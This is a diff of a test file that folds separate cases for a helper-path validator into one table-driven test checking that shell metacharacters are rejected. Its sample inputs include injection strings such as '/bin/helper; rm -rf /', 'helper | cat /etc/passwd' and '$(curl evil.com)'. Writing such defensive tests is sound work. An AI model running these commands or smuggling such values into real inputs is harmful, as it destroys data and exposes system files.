@@ -41,78 +41,21 @@ describe('validateHelperPath', () => {
     expect(validateHelperPath('my-helper')).toBe('my-helper')
   })
 
-  it('rejects semicolon (command chaining)', () => {
-    expect(() => validateHelperPath('/bin/helper; rm -rf /')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects ampersand (background execution)', () => {
-    expect(() => validateHelperPath('helper & malicious')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects pipe (command piping)', () => {
-    expect(() => validateHelperPath('helper | cat /etc/passwd')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects backtick (command substitution)', () => {
-    expect(() => validateHelperPath('`malicious`')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects dollar sign (variable expansion)', () => {
-    expect(() => validateHelperPath('helper$PATH')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects single quotes', () => {
-    expect(() => validateHelperPath("helper'injected")).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects double quotes', () => {
-    expect(() => validateHelperPath('helper"injected')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects newlines', () => {
-    expect(() => validateHelperPath('helper\nmalicious')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects carriage returns', () => {
-    expect(() => validateHelperPath('helper\rmalicious')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects backslash (escape sequences)', () => {
-    expect(() => validateHelperPath('helper\\injected')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects redirect operators', () => {
-    expect(() => validateHelperPath('helper > /tmp/stolen')).toThrow(
-      'shell metacharacters',
-    )
-    expect(() => validateHelperPath('helper < /etc/passwd')).toThrow(
-      'shell metacharacters',
-    )
-  })
-
-  it('rejects subshell syntax', () => {
-    expect(() => validateHelperPath('$(curl evil.com)')).toThrow(
-      'shell metacharacters',
-    )
+  it.each([
+    ['semicolon (command chaining)',     '/bin/helper; rm -rf /'],
+    ['ampersand (background execution)', 'helper & malicious'],
+    ['pipe (command piping)',            'helper | cat /etc/passwd'],
+    ['backtick (command substitution)',  '`malicious`'],
+    ['dollar sign (variable expansion)', 'helper$PATH'],
+    ['single quotes',                    "helper'injected"],
+    ['double quotes',                    'helper"injected'],
+    ['newlines',                         'helper\nmalicious'],
+    ['carriage returns',                 'helper\rmalicious'],
+    ['backslash (escape sequences)',     'helper\\injected'],
+    ['redirect operator >',             'helper > /tmp/stolen'],
+    ['redirect operator <',             'helper < /etc/passwd'],
+    ['subshell syntax',                  '$(curl evil.com)'],
+  ])('rejects %s', (_, input) => {
+    expect(() => validateHelperPath(input)).toThrow('shell metacharacters')
   })
 })
